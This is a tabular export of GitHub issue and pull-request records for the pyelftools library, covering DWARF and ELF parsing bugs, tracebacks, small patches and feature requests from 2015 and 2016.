",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/99/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/99/comments,https://api.github.com/repos/eliben/pyelftools/issues/99/events,https://github.com/eliben/pyelftools/issues/99,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/98,136147390,MDExOlB1bGxSZXF1ZXN0NjA1NTU2NTc=,98, Fix _data_member_location_extra to not crash  ,17010558,closed,FALSE,NA,NA,8,2016-02-24T18:31:04Z,2016-03-02T16:12:19Z,2016-03-02T12:16:40Z,NONE,NA,"When running scripts/readelf.py --debug-dump=info on file test/testfiles_for_readelf/hello.out (which is a new file I added for this pull request), the original code crashes with a python error. I created a workaround in elftools/dwarf/descriptions.py that fixes the problem, but you probably have a better way (I am a novice elftools and python user). Feel free to improve on my fix.
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/98/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/98/comments,https://api.github.com/repos/eliben/pyelftools/issues/98/events,https://github.com/eliben/pyelftools/pull/98,https://api.github.com/repos/eliben/pyelftools/pulls/98
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/97,134647491,MDU6SXNzdWUxMzQ2NDc0OTE=,97,Problem with _data_member_location_extra,17010558,closed,FALSE,NA,NA,5,2016-02-18T17:49:33Z,2017-02-04T17:09:02Z,2017-02-04T17:09:02Z,NONE,NA,"I got a python error when running readelf.py on a basic demo C file. I was able to debug it and put a kludge in your code to work around it, but you probably know a better way to make a more permanent fix.

To recreate the problem, create a hello.out file using the source files I have included (hello.c/h):
gcc -g -o hello.out hello.c
(or just use the .out file I have submitted)

Then run 
readelf.py --debug-dump=info hello.out
which gives the following python error: 

Traceback (most recent call last):
  File ""readelf.py"", line 1177, in <module>
    main()
  File ""readelf.py"", line 1156, in main
    readelf.display_debug_dump(options.debug_dump_what)
  File ""readelf.py"", line 658, in display_debug_dump
    self._dump_debug_info()
  File ""readelf.py"", line 880, in _dump_debug_info
    attr, die, section_offset)))
  File ""/home/bseifers/.local/lib/python2.6/site-packages/elftools/dwarf/descriptions.py"", line 38, in describe_attr_value
    extra_info = extra_info_func(attr, die, section_offset)
  File ""/home/bseifers/.local/lib/python2.6/site-packages/elftools/dwarf/descriptions.py"", line 442, in _data_member_location_extra
    return describe_DWARF_expr(attr.value, die.cu.structs)
  File ""/home/bseifers/.local/lib/python2.6/site-packages/elftools/dwarf/descriptions.py"", line 149, in describe_DWARF_expr
    dwarf_expr_dumper.process_expr(expr)
  File ""/home/bseifers/.local/lib/python2.6/site-packages/elftools/dwarf/dwarf_expr.py"", line 119, in process_expr
    self.stream = BytesIO(bytelist2string(expr))
  File ""/home/bseifers/.local/lib/python2.6/site-packages/elftools/common/utils.py"", line 19, in bytelist2string
    return b''.join(int2byte(b) for b in bytelist)
TypeError: 'int' object is not iterable

I was able to fix the problem by modifying elftools/dwarf/descriptions.py as follows

def _data_member_location_extra(attr, die, section_offset):
    # According to section 5.5.6 of the DWARF spec v4, a data member location
    # can be an integer offset, or a location description.
    #
    if attr.form in ('DW_FORM_data1', 'DW_FORM_data2',
                     'DW_FORM_data4', 'DW_FORM_data8'):
        return ''  # No extra description needed
# Start bseifers kludge

```
elif attr.form in ('DW_FORM_sdata'):
return str(attr.value)
```
# End bseifers kludge

```
else:
    return describe_DWARF_expr(attr.value, die.cu.structs)
```

I'm having trouble attaching the C files, so I'll include the source text here:

hello.c:
# include <stdio.h>
# include ""hello.h""

const int GLOBAL_CONST;

int tryGlobal;
struct def hiLo;

int main()
{
    int abc;
    printf(""Hello World\n"");
    return 0;
}

hello.h:
# ifndef hello_h
# define hello_h

struct def
{
    int ijk;
    char c;
    long long lint;
    float mno;
    int bit1 : 1;
    int bit3 : 3;
    int bit2 : 2;
    int bit4 : 4;
//};
}**attribute**((**packed**));
# endif

file:///home/bseifers/hello.c
file:///home/bseifers/hello.h
file:///home/bseifers/hello.out
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/97/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/97/comments,https://api.github.com/repos/eliben/pyelftools/issues/97/events,https://github.com/eliben/pyelftools/issues/97,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/96,130048858,MDU6SXNzdWUxMzAwNDg4NTg=,96,elf: _default_=Pass for enums,7366035,open,FALSE,NA,NA,5,2016-01-30T23:03:19Z,2016-10-26T03:15:50Z,NA,NONE,NA,"Why is `_default_=Pass` set for the enums?

If there is a bogus value in `E_MACHINE` it will not be caught, then when accessing `elffile['e_machine']` we will get the unmap value which is an int, but we expect a str.

20f07e8647e438d1cf218a01cf70e8bfad468ff5 add `_default_=Pass` to the enums, but without any explanation. Could you explain the reason?
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/96/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/96/comments,https://api.github.com/repos/eliben/pyelftools/issues/96/events,https://github.com/eliben/pyelftools/issues/96,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/95,128388125,MDU6SXNzdWUxMjgzODgxMjU=,95,List callable function in shared library,515889,closed,FALSE,NA,NA,4,2016-01-24T11:04:21Z,2016-01-27T07:57:09Z,2016-01-25T12:51:52Z,NONE,NA,"Is it possible to use `pyelftools` to list functions from shared library? For example:

```
#include <stdio.h>

void hello() {
    printf(""hello()\n"");
}
```

```
$ readelf.py <--magic-option> ./libhello.so
hello
```

The best output I could find is with `nm -D`:

```
$ nm -D --defined-only libhello.so                                                              
0000000000201038 B __bss_start
0000000000201038 D _edata
0000000000201040 B _end
00000000000006d8 T _fini
0000000000000578 T _init
00000000000006c5 T hello
```

but as you may see, there is a lot of excessive stuff here.
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/95/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/95/comments,https://api.github.com/repos/eliben/pyelftools/issues/95/events,https://github.com/eliben/pyelftools/issues/95,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/94,124465264,MDExOlB1bGxSZXF1ZXN0NTQ4NjE2NDU=,94,Fix relative import statements for Python 3.x compatibility.,502560,closed,FALSE,NA,NA,1,2015-12-31T12:12:59Z,2015-12-31T12:27:34Z,2015-12-31T12:27:34Z,NONE,NA,"When executing: ""python3 -m unittest discover"" the tests fail.
Python 3 requires a dot in front of the import to make a relative import.

Cheers!
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/94/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/94/comments,https://api.github.com/repos/eliben/pyelftools/issues/94/events,https://github.com/eliben/pyelftools/pull/94,https://api.github.com/repos/eliben/pyelftools/pulls/94
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/93,121655751,MDU6SXNzdWUxMjE2NTU3NTE=,93,Incorrect parsing of CORE types,111640,closed,FALSE,NA,NA,6,2015-12-11T07:39:15Z,2017-07-07T12:04:35Z,2017-07-07T12:04:35Z,NONE,NA,"CORE files use notes to store register information.  In particular, NT_GNU_ABI_TAG and NT_PRSTATUS are the same value.

Currently, `pyelftools` assumes the former and discards the [data stream](https://github.com/eliben/pyelftools/blob/d7aec6aba2cfed93e69dfe177cc161ccab42f15c/elftools/elf/segments.py#L127).

This should not be done when `elftype` is `""CORE""`.
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/93/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/93/comments,https://api.github.com/repos/eliben/pyelftools/issues/93/events,https://github.com/eliben/pyelftools/issues/93,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/92,120461284,MDU6SXNzdWUxMjA0NjEyODQ=,92,STB_GNU_UNIQUE support. Patch included,6786134,open,FALSE,NA,NA,1,2015-12-04T18:44:45Z,2017-02-04T17:09:35Z,NA,NONE,NA,"readelf.py shows STB_GNU_UNIQUE variables as unknown. What a shame

I offer a patch that fixes the problem

```
diff -urN a/descriptions.py b/descriptions.py
--- a/descriptions.py   2014-11-08 16:41:54.000000000 +0300
+++ b/descriptions.py   2015-12-04 17:01:23.000000000 +0300
@@ -323,6 +323,7 @@
     STB_LOCAL='LOCAL',
     STB_GLOBAL='GLOBAL',
     STB_WEAK='WEAK',
+    STB_LOOS='UNIQUE',
 )

 _DESCR_ST_VISIBILITY = dict(
```
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/92/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/92/comments,https://api.github.com/repos/eliben/pyelftools/issues/92/events,https://github.com/eliben/pyelftools/issues/92,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/91,120097569,MDExOlB1bGxSZXF1ZXN0NTI0OTM1NDE=,91,Add DW_TAG_GNU_call_site* for better dumping.,673922,closed,FALSE,NA,NA,4,2015-12-03T05:28:58Z,2015-12-11T02:28:24Z,2015-12-11T02:28:24Z,CONTRIBUTOR,NA,"This comes up for functions which have tail-calls optimized.
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/91/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/91/comments,https://api.github.com/repos/eliben/pyelftools/issues/91/events,https://github.com/eliben/pyelftools/pull/91,https://api.github.com/repos/eliben/pyelftools/pulls/91
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/90,120097553,MDExOlB1bGxSZXF1ZXN0NTI0OTM1MzA=,90,Minor changes to readelf formatting.,673922,closed,FALSE,NA,NA,0,2015-12-03T05:28:39Z,2015-12-07T21:45:16Z,2015-12-05T17:56:49Z,CONTRIBUTOR,NA,"This makes the output more similar to GNU readelf.
It's not identical - in particular there are still a lot of whitespace
differences - but at least gets you within striking distance of no changes when
comparing with ""diff -w"".
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/90/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/90/comments,https://api.github.com/repos/eliben/pyelftools/issues/90/events,https://github.com/eliben/pyelftools/pull/90,https://api.github.com/repos/eliben/pyelftools/pulls/90
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/89,120097099,MDExOlB1bGxSZXF1ZXN0NTI0OTMzMzI=,89,Improved DWARFv4 support.,673922,closed,FALSE,NA,NA,9,2015-12-03T05:24:26Z,2015-12-11T02:31:07Z,2015-12-11T02:29:34Z,CONTRIBUTOR,NA,"Handle DW_AT_data_member_location attributes with type DW_FORM_data*, which
store a simple integer offset rather than dwarf expression. This seems to come
up with struct members, at least on ARM.

Handle DW_AT_location attributes with type DW_FORM_sec_offset as not having
dwarf expressions, as allowed by the DWARFv4 standard. This seems to come up
with some local variables, at least on ARM.
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/89/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/89/comments,https://api.github.com/repos/eliben/pyelftools/issues/89/events,https://github.com/eliben/pyelftools/pull/89,https://api.github.com/repos/eliben/pyelftools/pulls/89
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/88,108567224,MDExOlB1bGxSZXF1ZXN0NDYxMTEzOTM=,88,Fix Note Type Id decoding.,1491187,closed,FALSE,NA,NA,2,2015-09-27T23:22:41Z,2016-10-16T20:52:03Z,2016-10-16T20:52:03Z,NONE,NA,"The ELF Note TypeId is actually used as a sub type to the Note Name.
That is to say that the enum values currently being used to detect the Note Type are only valid if the Note Name is 'GNU\0'.

This change rectifies that. 
It also handles the case that a segment may be slightly larger than the contained notes.
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/88/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/88/comments,https://api.github.com/repos/eliben/pyelftools/issues/88/events,https://github.com/eliben/pyelftools/pull/88,https://api.github.com/repos/eliben/pyelftools/pulls/88
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/87,108555864,MDU6SXNzdWUxMDg1NTU4NjQ=,87,pyelftools incorrectly decodign names of Note Types.,1491187,open,FALSE,NA,NA,4,2015-09-27T19:26:22Z,2020-06-07T14:43:00Z,NA,NONE,NA,"NoteTypes are subtypes of NoteName. i.e. its only valid to use the current enum if the NoteName is GNU.
I've added a patch to fix this to the fork I made .
https://github.com/eliben/pyelftools/compare/master...dethrophes:master

A also improved the handling of the scenario when the PT_NOTE segment aren't exactly the size of the contained notes.
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/87/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/87/comments,https://api.github.com/repos/eliben/pyelftools/issues/87/events,https://github.com/eliben/pyelftools/issues/87,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/86,107941415,MDU6SXNzdWUxMDc5NDE0MTU=,86,ELF file for ARM is not properly supported.,3856546,open,FALSE,NA,NA,3,2015-09-23T15:07:18Z,2016-10-24T12:19:27Z,NA,NONE,NA,"I have a dwarf file produced from ARM (android) and readelf.py fails:

```
$ readelf.py --debug-dump=info module_dwarf.ko
ELF error: Unsupported relocation type: 2
```

The reason for that is because there are no relocation recipes for ARM in elftools/elf/relocation.py only ones exist for MIPS and X64 and X86.

The complete list is here:
http://infocenter.arm.com/help/topic/com.arm.doc.ihi0044e/IHI0044E_aaelf.pdf table 4-8.

As a quick hack we can lie and say that this is a MIPS file and this works ok (at least on this file) but it would be good to have proper support.

```
class ELFFile(elffile.ELFFile):
    def get_machine_arch(self):
        result = super(ELFFile, self).get_machine_arch()
        if result == ""ARM"":
            result = ""MIPS""

        return result

elffile.ELFFile = ELFFile
```
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/86/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/86/comments,https://api.github.com/repos/eliben/pyelftools/issues/86/events,https://github.com/eliben/pyelftools/issues/86,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/85,105052908,MDU6SXNzdWUxMDUwNTI5MDg=,85,elf relocation looks incorrect in elf_relocation example script,10137,open,FALSE,NA,NA,3,2015-09-05T22:16:40Z,2016-11-01T12:36:27Z,NA,NONE,NA,"hello,

it seems that elf_relocation example returns wrong offsets:

Processing file: /bin/ls
  .rela.dyn section with 7 relocations
    Relocation (RELA)
      offset = 6406136
    Relocation (RELA)
      offset = 6407808
    Relocation (RELA)
      offset = 6407824
    Relocation (RELA)
      offset = 6407840
    Relocation (RELA)
      offset = 6407848
    Relocation (RELA)
      offset = 6407856
    Relocation (RELA)
      offset = 6407864

with reafelf:

Relocation section '.rela.dyn' at offset 0x1640 contains 7 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
00000061bff8  004200000006 R_X86_64_GLOB_DAT 0000000000000000         **gmon_start** + 0
00000061c680  007500000005 R_X86_64_COPY     000000000061c680             __progname + 0
00000061c690  007200000005 R_X86_64_COPY     000000000061c690                 stdout + 0
00000061c6a0  007e00000005 R_X86_64_COPY     000000000061c6a0                 optind + 0
00000061c6a8  008000000005 R_X86_64_COPY     000000000061c6a8                 optarg + 0
00000061c6b0  007a00000005 R_X86_64_COPY     000000000061c6b0        __progname_full + 0
00000061c6b8  007d00000005 R_X86_64_COPY     000000000061c6b8                 stderr + 0
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/85/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/85/comments,https://api.github.com/repos/eliben/pyelftools/issues/85/events,https://github.com/eliben/pyelftools/issues/85,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/84,105040097,MDExOlB1bGxSZXF1ZXN0NDQyODczOTg=,84,Fixed dynamic symbols iteration in the dynamic segment,14140540,closed,FALSE,NA,NA,4,2015-09-05T17:54:07Z,2016-10-16T20:51:40Z,2016-10-16T20:51:40Z,NONE,NA,"The previous dynamic symbol lookup worked by heuristically determine the end of the dynamic symbol table, because the dynamic segment does not provide the symbol table length, but only a pointer to the first entry. This heuristic attempts to iterate the dynamic segment tags in order to find the nearest higher pointer to the symbol table entry (the end of the table), which supposes to work in most cases. The problem is that not all the tag values in the dynamic segment represent pointers (d_ptr), some of them represent other values (d_val, for example in DT_NEEDED), and the code assumes that all the tag values represent a pointer. That leads to a wrong result and to an iteration on a partial symbol table.

Instead of the above logic, I decided to implement another method to determine the length of the dynamic symbol table: the hash table. The hash table contains an array called ""chains"", which contains (according to the specification) the same number of entries as the dynamic symbol table, and therefore this number (found in the hash table header) can be used to determine the number of the dynamic symbols in the dynamic symbol table.
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/84/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/84/comments,https://api.github.com/repos/eliben/pyelftools/issues/84/events,https://github.com/eliben/pyelftools/pull/84,https://api.github.com/repos/eliben/pyelftools/pulls/84
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/83,102924959,MDU6SXNzdWUxMDI5MjQ5NTk=,83,Parsing 12 Mb of DIE's takes 1 minute,6211792,closed,FALSE,NA,NA,5,2015-08-25T00:59:06Z,2020-02-04T14:36:42Z,2020-02-04T14:36:42Z,NONE,NA,"Hi , 

Performance seems pretty poor when parsing an entire DWARF section for an elf. The DWARF size is about 12 meg and parsing takes 1 minute. 

Attaching perf call graph. Commercial debuggers are able to parse the dwarf in < 2 seconds.  

RepeatUntil parse method seems to be eating most the time. Is it the object copying that is taking too long? 

Any suggestion on how to speed up performance? 

![output2](https://cloud.githubusercontent.com/assets/6211792/9456199/4e608e30-4a89-11e5-8818-5eb9753db46b.png)
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/83/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/83/comments,https://api.github.com/repos/eliben/pyelftools/issues/83/events,https://github.com/eliben/pyelftools/issues/83,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/82,101436331,MDExOlB1bGxSZXF1ZXN0NDI1OTUxMjk=,82,Added support for DWARF v4 line program headers.,1781103,closed,FALSE,NA,NA,1,2015-08-17T14:40:31Z,2015-08-25T12:12:44Z,2015-08-25T12:12:44Z,NONE,NA,"I had to use a MetaField as unfortunately a non DWARF v4 compile unit can reference a DWARF 4 line program and therefore an if statement in structs.py is insufficient.

This fixes #81 
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/82/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/82/comments,https://api.github.com/repos/eliben/pyelftools/issues/82/events,https://github.com/eliben/pyelftools/pull/82,https://api.github.com/repos/eliben/pyelftools/pulls/82
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/81,101277100,MDU6SXNzdWUxMDEyNzcxMDA=,81,DWARF V4 Line Programs not supported,1781103,closed,FALSE,NA,NA,1,2015-08-16T16:02:41Z,2015-08-25T12:12:44Z,2015-08-25T12:12:44Z,NONE,NA,"The current code doesn't support DWARF v4 Line program headers, specifically it doesn't understand the maximum_operations_per_instruction field resulting in everything getting out of alignment and the program crashing out.

I have a fix for this on my work laptop which I could push if desired?
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/81/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/81/comments,https://api.github.com/repos/eliben/pyelftools/issues/81/events,https://github.com/eliben/pyelftools/issues/81,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/80,95645556,MDExOlB1bGxSZXF1ZXN0NDAyMjU0MDc=,80,Added SHT_GNU_ATTRIBUTES to ENUM_SH_TYPE,1903285,closed,FALSE,NA,NA,8,2015-07-17T12:15:08Z,2016-10-16T20:51:18Z,2016-10-16T20:51:18Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/80/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/80/comments,https://api.github.com/repos/eliben/pyelftools/issues/80/events,https://github.com/eliben/pyelftools/pull/80,https://api.github.com/repos/eliben/pyelftools/pulls/80
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/79,93765211,MDExOlB1bGxSZXF1ZXN0Mzk0NjYxNjQ=,79,Added DT_MIPS_* constants to ENUM_D_TAG,1903285,closed,FALSE,NA,NA,0,2015-07-08T11:17:04Z,2015-07-09T12:35:11Z,2015-07-09T12:35:11Z,CONTRIBUTOR,NA,"Defined from here http://lxr.free-electrons.com/source/arch/mips/include/asm/elf.h#L49
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/79/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/79/comments,https://api.github.com/repos/eliben/pyelftools/issues/79/events,https://github.com/eliben/pyelftools/pull/79,https://api.github.com/repos/eliben/pyelftools/pulls/79
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/78,88389631,MDExOlB1bGxSZXF1ZXN0Mzc2Nzk2NTI=,78,Added SHT_GNU_LIBLIST constant to ENUM_SH_TYPE,1903285,closed,FALSE,NA,NA,0,2015-06-15T10:56:05Z,2015-06-20T17:54:33Z,2015-06-20T17:54:33Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/78/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/78/comments,https://api.github.com/repos/eliben/pyelftools/issues/78/events,https://github.com/eliben/pyelftools/pull/78,https://api.github.com/repos/eliben/pyelftools/pulls/78
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/77,85732917,MDU6SXNzdWU4NTczMjkxNw==,77,UnicodeDecodeError with python 3.4.3 on OS X,1825485,closed,FALSE,NA,NA,4,2015-06-06T10:05:49Z,2015-06-07T16:02:22Z,2015-06-07T16:02:22Z,NONE,NA,"```
$ python
Python 3.4.3 (default, Feb 25 2015, 21:28:45) 
[GCC 4.2.1 Compatible Apple LLVM 6.0 (clang-600.0.56)] on darwin
Type ""help"", ""copyright"", ""credits"" or ""license"" for more information.
>>> from elftools.elf.elffile import ELFFile
>>> e = ELFFile(open(""some_elf_file""))
Traceback (most recent call last):
  File ""<stdin>"", line 1, in <module>
  File ""/usr/local/lib/python3.4/site-packages/elftools/elf/elffile.py"", line 50, in __init__
    self._identify_file()
  File ""/usr/local/lib/python3.4/site-packages/elftools/elf/elffile.py"", line 200, in _identify_file
    magic = self.stream.read(4)
  File ""/usr/local/Cellar/python3/3.4.3/Frameworks/Python.framework/Versions/3.4/lib/python3.4/codecs.py"", line 319, in decode
    (result, consumed) = self._buffer_decode(data, self.errors, final)
UnicodeDecodeError: 'utf-8' codec can't decode bytes in position 32-33: invalid continuation byte
```

There's no such an error with python 2.7.10.
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/77/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/77/comments,https://api.github.com/repos/eliben/pyelftools/issues/77/events,https://github.com/eliben/pyelftools/issues/77,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/76,84578362,MDExOlB1bGxSZXF1ZXN0MzY4MzQ4ODU=,76,get_string of StringTableSection return ascii-decoded strings now,4865550,closed,FALSE,NA,NA,0,2015-06-03T13:56:38Z,2016-01-30T12:43:50Z,2015-06-05T13:09:54Z,CONTRIBUTOR,NA,"#74 squash into a single commit
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/76/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/76/comments,https://api.github.com/repos/eliben/pyelftools/issues/76/events,https://github.com/eliben/pyelftools/pull/76,https://api.github.com/repos/eliben/pyelftools/pulls/76
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/75,83072378,MDU6SXNzdWU4MzA3MjM3OA==,75,Ability to read the full list of ARM build attributes such as Tag_CPU_arch Tag_CPU_name from the .ARM.attributes section,67130,open,FALSE,NA,NA,3,2015-05-31T12:03:35Z,2015-06-03T13:02:19Z,NA,NONE,NA,"There doesn't seem to be a way to access these attributes for ARM ELF binaries.

http://llvm.org/docs/doxygen/html/ARMBuildAttributes_8h_source.html

The readelf tool does the correct thing here:
`readelf -A ...` where ... is some ARM ELF binary will show these tags.
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/75/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/75/comments,https://api.github.com/repos/eliben/pyelftools/issues/75/events,https://github.com/eliben/pyelftools/issues/75,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/74,74965435,MDExOlB1bGxSZXF1ZXN0MzUwODU5MDY=,74,get_string of StringTableSection return ascii-decoded strings now,4865550,closed,FALSE,NA,NA,6,2015-05-10T17:42:47Z,2015-06-05T13:16:42Z,2015-06-05T13:16:42Z,CONTRIBUTOR,NA,"simply decode the bytes as ascii strings.
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/74/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/74/comments,https://api.github.com/repos/eliben/pyelftools/issues/74/events,https://github.com/eliben/pyelftools/pull/74,https://api.github.com/repos/eliben/pyelftools/pulls/74
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/73,74873147,MDU6SXNzdWU3NDg3MzE0Nw==,73,Should `get_string` of `StringTableSection` return string instead of bytes?,4865550,open,FALSE,NA,NA,1,2015-05-10T09:02:11Z,2015-06-03T13:02:37Z,NA,CONTRIBUTOR,NA,"I tried to use 

```
efile.get_section_by_name('.init')
```

to get the '.init' section but it return None. I found it that name is bytes instead of string in Python3.

so now it should use

```
efile.get_section_by_name(b'.init')
```

to successfully get the right section. But I think that it is more easy and more readable way to get it by string.

What's more, the method name is `get_string` but not `get_cstring`
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/73/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/73/comments,https://api.github.com/repos/eliben/pyelftools/issues/73/events,https://github.com/eliben/pyelftools/issues/73,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/72,71985108,MDU6SXNzdWU3MTk4NTEwOA==,72,Need way to determine raw value of enum,331322,closed,FALSE,NA,NA,1,2015-04-29T20:43:01Z,2016-10-26T03:17:38Z,2016-10-26T03:17:38Z,NONE,NA,"Today, when we decode ELF enum fields, we represent the decoded value as a string. There's no easy way to recover the _numeric_ value from which that string was built. Instead of using str directly, we should subclass str and provide an attribute on the subclasses object that contains the original, un-decoded value.
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/72/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/72/comments,https://api.github.com/repos/eliben/pyelftools/issues/72/events,https://github.com/eliben/pyelftools/issues/72,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/71,71960170,MDU6SXNzdWU3MTk2MDE3MA==,71,Non-determinism of dict enumeration results in non-deterministic parsing,331322,closed,FALSE,NA,NA,5,2015-04-29T19:05:28Z,2018-01-15T22:33:56Z,2018-01-15T22:33:56Z,NONE,NA,"If we enumerate the segments of an ARM EABI ELF file and print the p_type field of each, we print different results on different runs with the same input. Both PT_ARM_UNWIND and PT_AARCH64_UNWIND have the value 0x70000001; we decode this value using the Enum facility of the Construct library. Depending on the order in which we enumerate the ENUM_P_TYPE entries, Enum can prefer either PT_ARM_UNWIND or PT_AARCH64_UNWIND.

Enumeration mappings we provide to Construct should never be ambiguous!
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/71/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/71/comments,https://api.github.com/repos/eliben/pyelftools/issues/71/events,https://github.com/eliben/pyelftools/issues/71,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/70,71067194,MDU6SXNzdWU3MTA2NzE5NA==,70,license mismatch in elftools.construct,502560,closed,FALSE,NA,NA,3,2015-04-26T13:28:20Z,2015-04-26T22:21:17Z,2015-04-26T22:21:17Z,NONE,NA,"Hello,
I noticed that elftools.construct is a 3rd party library which is, as far as I can tell, under MIT license. This is confusing and quite probably violation of license terms, since the main LICENSE file claims the code to be public domain.

Cheers,
Tomasz
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/70/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/70/comments,https://api.github.com/repos/eliben/pyelftools/issues/70/events,https://github.com/eliben/pyelftools/issues/70,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/69,66736324,MDExOlB1bGxSZXF1ZXN0MzI3MjMxNTc=,69,ELF: Find all symbols of a given name in `get_symbol_by_name`.,203893,closed,FALSE,NA,NA,1,2015-04-07T00:07:45Z,2015-04-11T12:40:00Z,2015-04-11T12:40:00Z,CONTRIBUTOR,NA,"It is possible for an ELF file's symbol table to contain multiple entries under
the same symbol name. Prior to this commit, it was only possible to retrieve
